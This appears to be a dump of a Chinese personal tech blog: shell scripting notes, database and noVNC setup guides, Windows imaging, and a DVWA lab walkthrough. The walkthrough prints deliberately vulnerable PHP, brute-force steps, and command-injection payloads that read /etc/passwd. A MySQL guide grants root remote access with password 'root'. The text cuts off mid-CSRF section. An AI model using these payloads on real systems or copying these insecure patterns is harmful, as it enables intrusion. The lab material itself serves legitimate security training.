echo &quot;network to $1 is ok&quot;else echo &quot;bad network to $1&quot;fi[hadoop@master shell]$ sh ping06.sh www.baidu.comnetwork to www.baidu.com is ok # 1.2.4 预定义变量 $0 脚本名 $* 所有参数 $@ 所有参数 $# 参数的个数 $$ 当前进程 PID $! 上一个进程 PID $? 上一个命令返回值，0 代表成功 123456789101112131415161718192021222324252627[hadoop@master shell]$ ls &amp;[1] 6950[hadoop@master shell]$ ip.txt ping03.sh ping04.sh ping05.sh ping06.sh ping07.sh read[1]+ 完成 ls --color=auto[hadoop@master shell]$ $!-bash: 6950: 未找到命令[hadoop@master shell]$ cat ping07.sh #!/bin/bashif [ $# -eq 0 ];then echo &quot;usage: `basename $0` filename&quot; exitfiif [ ! -f $1 ];then echo &quot;filename error&quot; exitfifor ip in `cat $1`do ping -c1 $ipdone[hadoop@master shell]$ sh ping07.sh usage: ping07.sh filename[hadoop@master shell]$ sh ping07.sh ip.txt # 1.3 变量的赋值 # 1.3.1 显式赋值 在 Shell 中，当第一次使用某变量名时，实际上就已经给变量赋值了。显式赋值的 格式为” 变量名 = 变量值”。为了避免歧义，显式赋值时__禁止在等号两边添加空格__， 这跟常见的编程语言有所不同。 1a=3 变量缺省为字符串类型 变量值中有空格需要使用引号 使用变量值进行赋值 name=“welcome to $place” # 1.3.2 从键盘赋值 1234read -p &quot;Please enter a ip:&quot; ipPlease enter a ip:1.1.1.1echo $ip1.1.1.1 # 1.3.3 使用位置变量赋值 1234cat test.shecho $1 $2sh test.sh hello worldhello world # 1.3.4 利用命令替换进行赋值 1234today=`date +%F`echo today2021-10-2touch `date +%F`_file.txt 双引号弱引用，单引号为强引用 12345678910[hadoop@master shell]$ cat ping04.sh #!/bin/bashhost=www.baidu.comping -c1 $host &amp;&gt;/dev/nullif [ $? -eq 0 ] then echo &quot;network to $host is ok&quot;else echo &quot;bad network to $host&quot;fi # 1.4 变量的运算 # 1.4.1.expr 数值运算命令 123456echo 1 + 31 + 3expr 1 + 34res = `expr $name1 \\* $name2`echo $res 在使用 expr 时，需要注意运算符及用于计算的数字两边必须有空格，否则会执行失败。 expr 支持乘法运算，在使用乘号 * 时必须用反斜杠转义，即 \\* # 1.4.2.“$(())” 或 “[]” 数值运算命令 双小括号 “$(())” 的作用是进行整数运算和数值比较，格式为 “ ((表达式))” 操作数、运算符两侧可以有空格 括号内 $ 符合可省略 12345678num1=10num2=20sum=$((num1+num2))echo $sum30sum=$[ num1+num2 ]echo $sum#可以使用加减乘除幂 # 1.4.3.let 数值运算命令 let 数值符号可以直接进行计算，不需要使用 $ 符号。 let 运算命令的语法格式为：let 赋值表达式 12345let num=1+2echo $num3#调试模式bash -vx test.sh # 1.4.4Shell 小数运算 bc 是 Unix/Linux 下的计算器，它还可以作为命令进行小数运算。 1234echo &quot;2^4&quot;|bc16echo &quot;scale=2;6/4&quot;|bc1.50","categories":[{"name":"平台","slug":"平台","permalink":"http://example.com/categories/%E5%B9%B3%E5%8F%B0/"}],"tags":[{"name":"shell","slug":"shell","permalink":"http://example.com/tags/shell/"}]},{"title":"建立CSV","slug":"建立CSV","date":"2021-07-20T03:40:59.000Z","updated":"2021-07-21T11:21:08.358Z","comments":true,"path":"2021/07/20/建立CSV/","link":"","permalink":"http://example.com/2021/07/20/%E5%BB%BA%E7%AB%8BCSV/","excerpt":"","text":"# 建立 CSV 环境 pyCharm 12345678910111213141516# -*- coding:utf-8 -*-import csv#获得一个文件对象csvFile = open(&quot;test.csv&quot;, &#x27;w+&#x27;)try: #返回一个编写器对象，负责将用户的数据转换为给定类文件对象上的分隔字符串 writer = csv.writer(csvFile) #调用编写器对象将行参数写入文件对象 writer.writerow((&#x27;number&#x27;, &#x27;number plus 2&#x27;, &#x27;number times 2&#x27;)) for i in range(10): #调用编写器对象将行参数写入文件对象 writer.writerow( (i, i+2, i*2))finally: #关闭文件 csvFile.close()","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Windows 定时开机、联网、打开远程服务","slug":"Windows 定时开机、联网、打开远程服务","date":"2021-06-21T03:40:59.000Z","updated":"2021-07-21T11:19:22.597Z","comments":true,"path":"2021/06/21/Windows 定时开机、联网、打开远程服务/","link":"","permalink":"http://example.com/2021/06/21/Windows%20%E5%AE%9A%E6%97%B6%E5%BC%80%E6%9C%BA%E3%80%81%E8%81%94%E7%BD%91%E3%80%81%E6%89%93%E5%BC%80%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","excerpt":"","text":"# Windows 定时开机、联网、打开远程服务 作者：SSR # 设置定时任务 右键此电脑 &gt; 管理 &gt; 任务计划程序 &gt; 任务计划库 在右侧创建任务 输入事件名称，选择不管是否登陆都要执行（关键！确保开机不登录也运行） 添加触发器 1，选择启动时 添加触发器 2，选择每日特定时间 添加操作并指定联网脚本（理论上 java、python 都随意，这里使用批处理脚本） 添加操作，指定打开远程连接软件 ToDesk (www.todesk.com) 点击确定完成设置 # 设置 BIOS 启动 打开开始 &gt; 设置 &gt; 更新和安全 &gt; 恢复 &gt; 立即重新启动 &gt; 疑难解答 &gt; 高级选项 &gt; UEFI 固件设置 &gt; 重启 找到电池选项，修改如下，保存开机 # 验证 一气呵成，简直完美","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"安装mysql_5.6.33 linux_64位","slug":"安装mysql_5.6.33 linux_64位","date":"2021-06-21T03:40:59.000Z","updated":"2021-07-21T11:29:27.002Z","comments":true,"path":"2021/06/21/安装mysql_5.6.33 linux_64位/","link":"","permalink":"http://example.com/2021/06/21/%E5%AE%89%E8%A3%85mysql_5.6.33%20linux_64%E4%BD%8D/","excerpt":"","text":"# 安装 mysql_5.6.33 linux_64 位 # 环境及软件 * Centos7 * mysql_5.6.33 linux_64位 * wget http://dev.mysql.com/get/Downloads/MySQL-5.6/mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz # 安装流程 # 1. 卸载老版本 1234find / -name mysqlrm -rf 上边查找到的路径，多个路径用空格隔开#或者下边一条命令即可find / -name mysql|xargs rm -r # 2. 解压安装包到 /usr/local 1tar -zxvf mysql-5.6.33-linux-glibc2.5-x86_64.tar.gz -C /usr/local # 3. 重命名文件夹 12cd /usr/localmv mysql-5.6.33-linux-glibc2.5-x86_64/ mysql # 4. 添加 mysql 用户组和用户名 123groupadd mysqluseradd -r -g mysql mysqlgroups mysql # 5. 更改文件夹权限 12cd mysql/chown -R mysql:mysql ./ # 6. 执行安装脚本 12345./scripts/mysql_install_db --user=mysql#安装完执行下列语句修改权限chown -R root:root ./chown -R mysql:mysql data # 7. 更改数据库密码 12345678910111213141516171819#首先启动mysql./support-files/mysql.server start#如果已经启动ps aux|grep mysqlkill -9 #上边的进程号#或者下边一条命令即可杀掉所有MySQL进程ps aux|grep mysql|awk &#x27;&#123;print $2&#125;&#x27;|xargs kill -9#修改密码为root./bin/mysqladmin -u root -h localhost.localdomain password &#x27;root&#x27;#登录mysql./bin/mysql -h 127.0.0.1 -u root -p root#修改其他用户密码update mysql.user set password=password(&#x27;root&#x27;) where user=&#x27;root&#x27;;flush privileges; # 8. 添加远程登录权限 123#在mysql中输入grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;root&#x27;;flush privileges; # 9. 将 MySQL 加入 Service 系统服务 12345cp support-files/mysql.server /etc/init.d/mysqldchkconfig --add mysqldchkconfig mysqld onservice mysqld restartservice mysqld status # 10. 配置 my.cnf 123456789vi my.cnf#添加如下语句character-set-server=utf8lower_case_table_names=1max_allowed_packet=100M#配置完成重启服务service mysqld restartservice mysqld status","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"centos7下yum安装MariaDB","slug":"Centos7下yum安装MariaDB","date":"2021-05-20T03:40:59.000Z","updated":"2021-07-21T11:12:11.809Z","comments":true,"path":"2021/05/20/Centos7下yum安装MariaDB/","link":"","permalink":"http://example.com/2021/05/20/Centos7%E4%B8%8Byum%E5%AE%89%E8%A3%85MariaDB/","excerpt":"","text":"# centos7 下 yum 安装 MariaDB CentOS 7 下 mysql 下替换成 MariaDB 了。 MariaDB 数据库管理系统是 MySQL 的一个分支，主要由开源社区在维护，采用 GPL 授权 许可 MariaDB 的目的是完全兼容 MySQL，包括 API 和命令行，使之能轻松成为 MySQL 的代替品。 # 安装 123456789101112131415161718192021222324yum -y install mariadb mariadb-serversystemctl start mariadb #启动mariadbsystemctl enable mariadb #设置开机自启动systemctl stop mariadb #停止MariaDBsystemctl restart mariadb #重启MariaDBmysql_secure_installation #设置root密码等相关mysql -uroot -p #测试登录 # 修改密码update mysql.user set password=PASSWORD(&#x27;123456&#x27;) where user=&#x27;root&#x27;;# 更新权限flush privileges; # 新建用户#create user &#x27;用户名&#x27;@&#x27;主机&#x27; identified by &#x27;密码&#x27; 如果只允许本机访问 @&#x27;localhost&#x27; , 或者指定一个ip @&#x27;192.xx.xx.xx&#x27; 或者使用通配: @&#x27;%&#x27;create user &#x27;read_visa&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;# 新用户权限# grant 操作类型 on 数据库.表 to 用户@&#x27;主机&#x27; 数据库,表,主机都支持通配符 grant select, insert on *.* to &#x27;read_visa&#x27;@&#x27;%&#x27;# grant all on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;; // all 表示所有权限grant select on visa.* to &#x27;read_visa&#x27;@&#x27;%&#x27;;","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Win10+noVNC","slug":"Win10+noVNC","date":"2021-05-19T03:40:59.000Z","updated":"2021-07-21T11:25:46.959Z","comments":true,"path":"2021/05/19/Win10+noVNC/","link":"","permalink":"http://example.com/2021/05/19/Win10+noVNC/","excerpt":"","text":"# 网页实现远程桌面 # 环境 Win10 (被访问的 Server, 设其 IP 为 11.11.11.11) # 软件 nodejs noVnc websockify tightvnc # 搭建流程 Server 安装 nodejs 安装 ws、optimist 模块（执行 websockify.js 文件所需） 123npm install wsnpm install optimistnpm install mime-types 将 noVNC 解压到 C:\\Users\\XXX (用户名)\\node_modules\\ 下 将 websockify 解压到 C:\\Users\\XXX (用户名)\\node_modules\\noVNC 下 如图 将./noVNC/vnc.html 复制一份，更名为 index.html Server 安装 tightVNC 运行 tightVNC server, 任务栏找到图标 单击打开，设置连接密码 这里服务默认端口 5900，不用更改 打开 cmd，使用 websockify.js 转发 9000 端口的 http 链接到 5900 端口，运行以下命令 1234node C:\\Users\\SSR\\node_modules\\noVNC\\websockify-js-master\\websockify\\websockify.js --web C:\\Users\\SSR\\node_modules\\noVNC 9000 localhost:5900# 注意更改用户路径# 注意更改localhost为本机IP（11.11.11.11） 保持 cmd 窗口后台运行，打开 Win10 防火墙设置，添加入站规则，允许 TCP9000 端口入站 配置完成 # 验证效果 打开同网段另一台电脑，打开浏览器 访问 ServerIP:9000，形如 11.11.11.11:9000 点击连接，输入之前设置的连接密码 成功连接 Win10 ![](E:\\SSR\\Pictures\\ 屏幕截图 2021-05-18 110948.png)","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Linux+noVNC","slug":"Linux+noVNC","date":"2021-05-18T03:40:59.000Z","updated":"2021-07-21T11:22:54.874Z","comments":true,"path":"2021/05/18/Linux+noVNC/","link":"","permalink":"http://example.com/2021/05/18/Linux+noVNC/","excerpt":"","text":"# Linux+noVNC # 环境及软件 Centos7 桌面 noVNC websockify tigervnc-server # 搭建流程 安装 Centos7 桌面版 安装 noVNC git clone https://github.com/novnc/noVNC git clone https://github.com/novnc/websockify mv ./websockify ./noVNC/ cd ./noVNC/utils/ openssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem 生成证书，一直回车 yum -y install python3 yum -y install numpy 缺啥补啥 安装 tigervnc-server yum -y install tigervnc-server 建立服务 vncserver :1 输入连接密码，最低 6 位数 牢记访问密码 启动服务 1/root/noVNC/utils/launch.sh --vnc localhost:5901 # 测试 打开另一台同网段电脑浏览器，Chrome/Firefox 访问 http://CentosIP/vnc.html 输入密码 网页连接成功","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"Win7系统封装与快速装机","slug":"Win7系统封装","date":"2021-05-03T03:40:59.000Z","updated":"2021-07-21T11:18:11.649Z","comments":true,"path":"2021/05/03/Win7系统封装/","link":"","permalink":"http://example.com/2021/05/03/Win7%E7%B3%BB%E7%BB%9F%E5%B0%81%E8%A3%85/","excerpt":"","text":"# Win7 系统封装与快速装机 # 背景 最近小编接受了一项任务，给一定数量的电脑更换系统，并且需要根据实际，在系统中安装环境和许多软件，而一台一台安装又不大现实，于是就开始了这一次艰辛的历程，从开始着手到最终成功花费了近一周的空闲时间，失败次数 4 次以上，而每次尝试花费的时间都在 5 小时左右。。。 于是特地把过程记录下来，希望能帮到有需要的人，所需要的工具放在最后。 # 任务目标 给若干电脑装系统，并带有自定义的软件。采取的解决方法是制作自定义的封装系统。 # 准备工具 Win7 镜像 虚拟机环境 各类软件安装包 优化清理工具 系统封装工具 PE 启动盘一个 # 安装系统 首先在 VMware 中安装 Win7 系统，安装系统步骤省略。 安装到这个界面时停住，建立一次快照，记得每做完几步就建立快照哦。 此时注意，第一个关键点，否则将失败，这里不添加用户，按下 Ctrl+Shift+F3，系统重启，自动用 Administrator 登录。出现以下界面。 此时注意，第二个关键点，这里选择取消，并且以后的每次重启都选择取消。之后改改分辨率，将桌面图标调出来。 # 安装所需软件 接下来就是一个接一个地安装软件。U1S1，安装这些软件真太费时间了。 这里小编安装了一些语言环境和常用的软件，当然也可以结合需要安装不同软件。 # 清理优化 安装完所有需要的软件后，接下来将系统清理一下。 使用 Dism++ 等清理工具将系统运行不需要的功能和缓存清除，修改一些系统设置，清空回收站等，清理完后系统减小了约 10G 的空间。 # 封装系统 接下来到最关键的步骤了，这一步直接决定成功与否。 # 第一次封装 在做好一切准备工作后，确定这就是你想要的系统时，就可以开始封装系统了。 使用系统封装工具 EasySysprep5 对系统进行第一次封装，注意这次是在 Win7 系统中进行。 直接一键封装。封装结束后需要立即进入 PE 系统进行第二次封装。 # 第二次封装 关于 VM 中进入 PE 系统，这里有些经验分享给你。 第一步，将虚拟机关机，在虚拟机设置中添加硬盘，直到这一步。 这里选择使用物理磁盘，选择 PhysicalDrive1，我的情况是电脑只有一块硬盘，那么第二块就是 U 盘了，如果有疑惑可以打开磁盘管理查看，使用整个磁盘，添加完毕。扩展一下，这边也可以使用主机硬盘分区，就类似于共享了主机的一块分区，但是注意不能是系统分区和运行软件的分区。 开机选择打开电源进入固件，就是进入 BIOS 改变启动顺序，在 BOOT 选项中将第二块硬盘放到最上面，F10 保存重启。 进入 PE 后进行第二次封装，一键封装就行，如果没啥问题就成功了。封装完成后别重启，进行下一步系统备份。 # 制作 Ghost 镜像 使用 PE 系统的 Ghost 软件进行备份，选择 Win7 系统所在的盘，备份成为.gho 文件。 经过近一小时的等待，备份 40 多 G 的系统，得到了 17G 大小的 GHO 镜像，到这里制作自定义系统就结束了。 # 测试效果 小编在是直接在原系统上测试，进入 PE 使用分区工具将原系统分区和大约 300M 大小的引导分区格式化，再使用 Ghost 恢复分区，经过一小时的等待，恢复完成。 这时别着急重启系统，使用 DG 分区工具重建还原后的分区引导，不然可能不能正常开机哦。 成功启动。 所有环境都在，软件功能正常。 # 总结 这件看起来很简单的事，为什么花了这么久的时间？一开始呢，就想着制作 GHO 镜像，然后还原就能用，但是并非如此，其实在 CSDN 上有很成熟的教程，但是之前并不知道 “系统封装” 这个关键词，信息上的缺乏真会延误战机。不过呢，在过程中了解了许多系统相关知识，还在 U 盘里装了个 MSDOS 系统，等等收获也是不少。 最后手动 @CSDN 作者 “小鱼儿 yr” 提供的详细教程，如果觉得这篇教程不够详细，可以再看看他的。 工具链接：https://pan.baidu.com/s/1t_X6c1xftADwYN1diiRO1Q 提取码：lc7e","categories":[],"tags":[{"name":"平台","slug":"平台","permalink":"http://example.com/tags/%E5%B9%B3%E5%8F%B0/"}]},{"title":"DVWA通关手册","slug":"DVWA","date":"2021-04-15T03:40:59.000Z","updated":"2021-07-21T11:14:10.305Z","comments":true,"path":"2021/04/15/DVWA/","link":"","permalink":"http://example.com/2021/04/15/DVWA/","excerpt":"","text":"# DVWA 通关手册 # Brute Force 登录界面 # # Low 1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Get username $user = $_GET[ &#x27;username&#x27; ]; // Get password $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 使用 Burp Suit 抓包 Send to intruder 选择密码位置 上字典 根据返回长度判断正确密码 # Medium 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check the database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 加入了参数的判断，防止部分 SQL 注入，加入 sleep (2) 没有防爆破机制，操作同 Low 等级 # High 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 加入 Anti-CSRF token 机制，验证本次请求中是否包含上一个回应中的 token 抓包分析 Send to intruder，选择 position，两个爆破位应使用 Pitchfork 模式 option 中选择 Grep-Extract，添加回应包中的 token 值 第一个位置应用字典，第二个位置应用 grep 内容，并初始化 token 值 Start attack，一样看长度 # Command Injection 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139#Command Injection#Impossible Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; $target = stripslashes( $target ); // Split the IP into 4 octects $octet = explode( &quot;.&quot;, $target ); // Check IF each octet is an integer if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123; // If all 4 octets are int&#x27;s put the IP back together. $target = $octet[0] . &#x27;.&#x27; . $octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;#High Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;#Medium Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt;#Low Command Injection Source&lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; # Low 127.0.0.1 127.0.0.1&amp;&amp; whoami 127.0.0.1&amp;&amp; pwd 127.0.0.1&amp;&amp;ls …/…/ 127.0.0.1&amp;&amp;cat …/…/php.ini 127.0.0.1&amp;&amp;cat /etc/passwd # Medium 127.0.0.1&amp; ls 127.0.0.1&amp; cat /etc/passwd # High 127.0.0.1 |ls # Cross Site Request Forgery (CSRF) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158# CSRF# Impossible CSRF Source&lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Get input $pass_curr = $_GET[ &#x27;password_current&#x27; ]; $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Sanitise current password input $pass_curr = stripslashes( $pass_curr ); $pass_curr = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_curr ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_curr = md5( $pass_curr ); // Check that the current password is correct $data = $db-&gt;prepare( &#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27; ); $data-&gt;bindParam( &#x27;:user&#x27;, dvwaCurrentUser(), PDO::PARAM_STR ); $data-&gt;bindParam( &#x27;:password&#x27;, $pass_curr, PDO::PARAM_STR ); $data-&gt;execute(); // Do both new passwords match and does the current password match the user? if( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == 1 ) ) &#123; // It does! $pass_new = stripslashes( $pass_new ); $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? 